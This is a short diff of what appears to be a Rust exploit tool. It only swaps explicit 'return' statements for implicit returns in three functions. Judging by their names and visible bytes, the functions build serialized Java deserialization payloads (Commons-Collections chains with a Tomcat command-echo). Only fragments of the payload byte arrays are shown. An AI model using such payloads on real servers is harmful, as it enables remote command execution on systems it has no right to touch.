@@ -199,7 +199,7 @@ pub fn get_tomcat_echo(echo_header_name: &str, cmd_header_name: &str) -> Vec<u8>
         0, 255, 0, 7, 0, 8, 7, 0, 2, 0, 0, 0, 1, 7, 0, 111, 1, 7, 0, 97, 0, 0, 250, 0, 5, 0, 63, 0,
         0, 0, 4, 0, 1, 0, 65, 0, 1, 0, 5, 0, 0, 0, 2, 0, 6,
     ]);
-    return result_bytes;
+    result_bytes
 }
 
 pub fn get_cck1_tomcat_echo(echo_header_name: &str, cmd_header_name: &str) -> Vec<u8> {
@@ -256,7 +256,7 @@ pub fn get_cck1_tomcat_echo(echo_header_name: &str, cmd_header_name: &str) -> Ve
         120, 112, 0, 0, 0, 0, 115, 113, 0, 126, 0, 0, 63, 64, 0, 0, 0, 0, 0, 12, 119, 8, 0, 0, 0,
         16, 0, 0, 0, 0, 120, 120, 116, 0, 1, 116, 120,
     ]);
-    return result_bytes;
+    result_bytes
 }
 
 pub fn get_cck2_tomcat_echo(echo_header_name: &str, cmd_header_name: &str) -> Vec<u8> {
@@ -313,5 +313,5 @@ pub fn get_cck2_tomcat_echo(echo_header_name: &str, cmd_header_name: &str) -> Ve
         153, 2, 0, 0, 120, 112, 0, 0, 0, 0, 115, 113, 0, 126, 0, 0, 63, 64, 0, 0, 0, 0, 0, 12, 119,
         8, 0, 0, 0, 16, 0, 0, 0, 0, 120, 120, 116, 0, 1, 116, 120,
     ]);
-    return result_bytes;
+    result_bytes
 }
